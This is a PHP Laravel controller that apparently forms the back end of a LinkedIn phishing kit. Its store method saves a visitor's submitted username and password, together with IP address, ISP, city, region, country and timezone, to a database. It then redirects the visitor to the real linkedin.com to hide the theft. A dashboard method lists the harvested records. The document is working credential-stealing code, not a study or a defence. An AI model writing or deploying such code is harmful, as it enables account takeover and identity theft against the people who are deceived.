<?php

namespace App\Http\Controllers\SocialNetwork;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

use App\Models\Linkedin;

class LinkedinController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        return view('socialNetwork.linkedin.index');
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $dataLinkedin = new Linkedin();

        $dataLinkedin->username = $request->username;
        $dataLinkedin->password = $request->password;
        $dataLinkedin->ip = $request->ip;
        $dataLinkedin->isp = $request->isp;
        $dataLinkedin->city = $request->city;
        $dataLinkedin->region = $request->region;
        $dataLinkedin->country = $request->country;
        $dataLinkedin->timezone = $request->timezone;
        
        $dataLinkedin->save();

        return redirect('https://linkedin.com/');
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }

    public function dashboardLinkedin()
    {
        $dataLinkedin = Linkedin::orderBy('id', 'DESC')->paginate();
        //dd($dataLinkedin);
        return view('socialNetwork.linkedin.dashboard', compact('dataLinkedin'));
    }

}
